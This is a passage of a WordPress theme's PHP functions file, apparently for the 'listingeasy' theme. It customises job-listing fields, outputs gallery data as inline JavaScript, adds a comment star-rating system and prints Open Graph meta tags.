		'placeholder' => esc_html__( 'e.g company@domain.com', 'listingeasy' ),
		'priority'    => 2.5
	);
	$fields['_discount'] = array(
		'label'       => esc_html__( 'Discount', 'listingeasy' ),
		'placeholder' => esc_html__( 'e.g 30%', 'listingeasy' ),
		'priority'    => 2.6
	);

	unset( $fields['_company_logo'] );
	unset( $fields['_company_video'] );
	unset( $fields['_company_name'] );
    unset( $fields['_company_twitter'] );
	unset( $fields['_application'] );

	return $fields;
}
add_filter( 'job_manager_job_listing_data_fields', 'gt3_add_fields', 1 );

if (!function_exists('gt3_pre')) {
    function gt3_pre($array)
    {
        echo "<pre>";
        print_r($array);
        echo "</pre>";
    }
}

if (!function_exists('gt3_gallery_array2js')) {
    function gt3_gallery_array2js($grid_array, $gal_id) {
		?>
        <script>
			if (typeof grid_gal_array == "undefined") {
				var grid_gal_array = [];
			}
			if (typeof packery_gal_array == "undefined") {
				var packery_gal_array = [];
			}
			var packery_item = {},
				already_showed = 0;
			if (jQuery('.grid_gallery').size() > 0) {
				var grid_container = jQuery('.grid_gallery'),
					grid_container_wrapper = jQuery('.grid_gallery_wrapper');
			
				grid_gal_array['grid_<?php echo esc_attr($gal_id); ?>'] = {};
				grid_gal_array['grid_<?php echo esc_attr($gal_id); ?>'].id = '<?php echo esc_attr($gal_id); ?>';
				grid_gal_array['grid_<?php echo esc_attr($gal_id); ?>'].showed = 0;
				grid_gal_array['grid_<?php echo esc_attr($gal_id); ?>'].items = [];
				<?php
				$i = 0;
			foreach ($grid_array as $image) {
					?>
				packery_item = {};
				packery_item.slide_type = "<?php echo esc_attr($image['slide_type']); ?>";
				<?php if ($image['slide_type'] == 'video') { ?>
				packery_item.src = "<?php echo esc_attr($image['url']); ?>";
				<?php } ?>
				packery_item.img = "<?php echo esc_url($image['url']); ?>";
				packery_item.thmb = "<?php echo esc_url($image['thmb']); ?>";
				packery_item.title = "<?php echo esc_attr($image['title']); ?>";
				packery_item.caption = "<?php echo !empty($image['caption']) ? esc_attr($image['caption']) : ''; ?>";
				packery_item.counter = "<?php echo esc_attr($image['count']); ?>";
				grid_gal_array['grid_<?php echo esc_attr($gal_id); ?>'].items.push(packery_item);
			<?php $i++;} ?>
			}
			if (jQuery('.packery_gallery').size() > 0) {
				var packery_container = jQuery('.packery_gallery'),
					packery_container_wrapper = jQuery('.packery_gallery_wrapper');
			
				packery_gal_array['packery_<?php echo esc_attr($gal_id); ?>'] = {};
				packery_gal_array['packery_<?php echo esc_attr($gal_id); ?>'].id = '<?php echo esc_attr($gal_id); ?>';
				packery_gal_array['packery_<?php echo esc_attr($gal_id); ?>'].showed = 0;
				packery_gal_array['packery_<?php echo esc_attr($gal_id); ?>'].items = [];
				<?php
				$i = 0;
			foreach ($grid_array as $image) {
					?>
				packery_item = {};
				packery_item.slide_type = "<?php echo esc_attr($image['slide_type']); ?>";
				<?php if ($image['slide_type'] == 'video') { ?>
				packery_item.src = "<?php echo esc_attr($image['src']); ?>";
				<?php } ?>
				packery_item.img = "<?php echo esc_url($image['url']); ?>";
				packery_item.thmb = "<?php echo esc_url($image['thmb']); ?>";
				packery_item.title = "<?php echo esc_attr($image['title']); ?>";
				packery_item.caption = "<?php echo !empty($image['caption']) ? esc_attr($image['caption']) : ''; ?>";
				packery_item.counter = "<?php echo esc_attr($image['count']); ?>";
				packery_gal_array['packery_<?php echo esc_attr($gal_id); ?>'].items.push(packery_item);
			<?php $i++;} ?>
			}
			
		</script>
        <?php
	}
}

/* Listing Rating System */
add_action('comment_post','gt3_comment_ratings');
function gt3_comment_ratings($comment_id) {
    $post_rate = !empty($_POST['rate']) ? $_POST['rate'] : '';
    add_comment_meta($comment_id, 'rate', $post_rate);
}

function gt3_listing_grade($grade) {
    switch ($grade) {
        case '0':
            $alt = 'listing_stars0';
            break;
        case '1':
            $alt = 'listing_star1';
            break;
        case '2':
            $alt = 'listing_stars2';
            break;
        case '3':
            $alt = 'listing_stars3';
            break;
        case '4':
            $alt = 'listing_stars4';
            break;
        case '5':
            $alt = 'listing_stars5';
            break;
        default:
            $alt = 'listing_no_grade';
            break;
    }
 
    if (!isset($grade) || $grade == '')
        echo  $alt;
    else {
		?>
		<div class="listing_comment_stars <?php echo  $alt; ?>"></div>
		<?php
    }
}

function gt3_get_total_ratings_count($id) {
    $comment_array = get_approved_comments($id);
    $count = 1;
    $i = 0;
 
    if ($comment_array) {
        $total = 0;
        foreach($comment_array as $comment){
            $rate = get_comment_meta($comment->comment_ID, 'rate');
            if(isset($rate[0]) && $rate[0] > 0) {
                $i++;
            }
        } 
    }
	return $i;
}
function gt3_get_average_ratings($id) {
    $comment_array = get_approved_comments($id);
    $count = 1;
 
    if ($comment_array) {
        $i = 0;
        $total = 0;
        foreach($comment_array as $comment){
            $rate = get_comment_meta($comment->comment_ID, 'rate');
            if(isset($rate[0]) && $rate[0] > 0) {
                $i++;
                $total += $rate[0];
            }
        }
 		if($i > 0) {
			$total_tmp = $total/$i;
			$show_total_rate = round($total_tmp, 0, PHP_ROUND_HALF_DOWN);
			if ($total_tmp > $show_total_rate) {
				$show_total_rate = $show_total_rate . '_5';
			}
		}
        if($i == 0)
            return false;
        else
            return $show_total_rate;
    } else {
        return false;
    }
}

if (!function_exists('gt3_open_graph_meta') && !class_exists( 'WPSEO_Options' )) {
    add_action( 'wp_head', 'gt3_open_graph_meta', 5 );
    function gt3_open_graph_meta(){
        global $post;
        if ( !is_singular()) //if it is not a post or a page
            return;
            echo '<meta property="og:title" content="' . get_the_title() . '"/>';
            echo '<meta property="og:type" content="article"/>';
            echo '<meta property="og:url" content="' . get_permalink() . '"/>';
            echo '<meta property="og:site_name" content="'.esc_html(get_bloginfo('name')).'"/>';
        if(!has_post_thumbnail( $post->ID )) { //the post does not have featured image, use a default image
            $header_logo_src = gt3_option("header_logo");
            $header_logo_src = !empty($header_logo_src) ? $header_logo_src['url'] : '';
            if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
                if (rwmb_meta('mb_customize_logo') == 'custom') {
                    $mb_header_logo_src = rwmb_meta("mb_header_logo");
                    if (!empty($mb_header_logo_src)) {
                        $header_logo_src = array_values($mb_header_logo_src);
                        $header_logo_src = $header_logo_src[0]['full_url'];
                    }
                }
            }
            echo '<meta property="og:image" content="' . esc_url($header_logo_src) . '"/>';
        }
        else{
            $thumbnail_src = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'medium_large' );
            echo '<meta property="og:image" content="' . esc_attr( $thumbnail_src[0] ) . '"/>';
        }
    }
}

add_theme_support( 'html5', array(
    'gallery'
));
